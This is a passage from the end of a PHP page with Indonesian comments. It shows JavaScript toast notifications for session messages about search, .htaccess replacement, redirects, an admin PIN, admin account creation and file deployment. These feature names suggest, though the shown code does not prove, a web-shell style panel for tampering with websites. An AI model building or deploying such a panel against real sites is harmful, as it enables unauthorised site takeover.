                    const form = this.closest('form');
                    const fileNameInput = form.querySelector('input[name="fileNameToEdit"]');
                    if (fileNameInput) {
                        openEditModal(fileNameInput.value);
                    }
                });
            });
        });
    </script>

    <!-- Toast notifications untuk session messages (jika ada) -->
    <?php
    // Tampilkan pesan dari session jika ada
    if (isset($_SESSION['search_message'])): ?>
    <script>
        (function() {
            const msg = <?= json_encode($_SESSION['search_message']) ?>;
            const status = <?= json_encode($_SESSION['search_status'] ?? 'info') ?>;
            const toast = document.createElement('div');
            toast.className = `alert ${status === 'error' ? 'error' : status === 'partial' ? 'warning' : 'success'}`;
            toast.style.position = 'fixed';
            toast.style.bottom = '20px';
            toast.style.right = '20px';
            toast.style.zIndex = '9999';
            toast.innerHTML = msg.replace(/\n/g, '<br>');
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 20000);
        })();
    </script>
    <?php unset($_SESSION['search_message'], $_SESSION['search_status']); endif; ?>

    <?php if (isset($_SESSION['htreplace_message'])): ?>
    <script>
        (function() {
            const msg = <?= json_encode($_SESSION['htreplace_message']) ?>;
            const status = <?= json_encode($_SESSION['htreplace_status'] ?? 'info') ?>;
            const toast = document.createElement('div');
            toast.className = `alert ${status === 'error' ? 'error' : 'success'}`;
            toast.style.position = 'fixed';
            toast.style.bottom = '80px';
            toast.style.right = '20px';
            toast.style.zIndex = '9999';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 20000);
        })();
    </script>
    <?php unset($_SESSION['htreplace_message'], $_SESSION['htreplace_status']); endif; ?>

    <?php if (isset($_SESSION['ts_message'])): ?>
    <script>
        (function() {
            const msg = <?= json_encode($_SESSION['ts_message']) ?>;
            const status = <?= json_encode($_SESSION['ts_status'] ?? 'info') ?>;
            const toast = document.createElement('div');
            toast.className = `alert ${status === 'error' ? 'error' : status === 'partial' ? 'warning' : 'success'}`;
            toast.style.position = 'fixed';
            toast.style.bottom = '140px';
            toast.style.right = '20px';
            toast.style.zIndex = '9999';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 20000);
        })();
    </script>
    <?php unset($_SESSION['ts_message'], $_SESSION['ts_status']); endif; ?>

    <?php if (isset($_SESSION['redirect_message'])): ?>
    <script>
        (function() {
            const msg = <?= json_encode($_SESSION['redirect_message']) ?>;
            const status = <?= json_encode($_SESSION['redirect_status'] ?? 'info') ?>;
            const toast = document.createElement('div');
            toast.className = `alert ${status === 'error' ? 'error' : 'success'}`;
            toast.style.position = 'fixed';
            toast.style.bottom = '200px';
            toast.style.right = '20px';
            toast.style.zIndex = '9999';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 20000);
        })();
    </script>
    <?php unset($_SESSION['redirect_message'], $_SESSION['redirect_status']); endif; ?>

    <?php if (isset($_SESSION['admin_pin_error'])): ?>
    <script>
        (function() {
            const msg = <?= json_encode($_SESSION['admin_pin_error']) ?>;
            const toast = document.createElement('div');
            toast.className = 'alert error';
            toast.style.position = 'fixed';
            toast.style.bottom = '260px';
            toast.style.right = '20px';
            toast.style.zIndex = '9999';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 20000);
        })();
    </script>
    <?php unset($_SESSION['admin_pin_error']); endif; ?>

    <?php if (isset($_SESSION['admin_create_status'])): ?>
    <script>
        (function() {
            const msg = <?= json_encode($_SESSION['admin_create_status']) ?>;
            const isSuccess = msg.indexOf('Berhasil') !== -1;
            const toast = document.createElement('div');
            toast.className = `alert ${isSuccess ? 'success' : 'error'}`;
            toast.style.position = 'fixed';
            toast.style.bottom = '320px';
            toast.style.right = '20px';
            toast.style.zIndex = '9999';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 20000);
        })();
    </script>
    <?php unset($_SESSION['admin_create_status']); endif; ?>

    <?php if (isset($_SESSION['deploy_file_message'])): ?>
    <script>
        (function() {
            const msg = <?= json_encode($_SESSION['deploy_file_message']) ?>;
            const status = <?= json_encode($_SESSION['deploy_file_status'] ?? 'info') ?>;
            const toast = document.createElement('div');
            toast.className = `alert ${status === 'error' ? 'error' : status === 'partial' ? 'warning' : 'success'}`;
            toast.style.position = 'fixed';
            toast.style.bottom = '380px';
            toast.style.right = '20px';
            toast.style.zIndex = '9999';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 20000);
        })();
    </script>
    <?php unset($_SESSION['deploy_file_message'], $_SESSION['deploy_file_status']); endif; ?>

</body>
</html>
<?php
ob_end_flush();
?>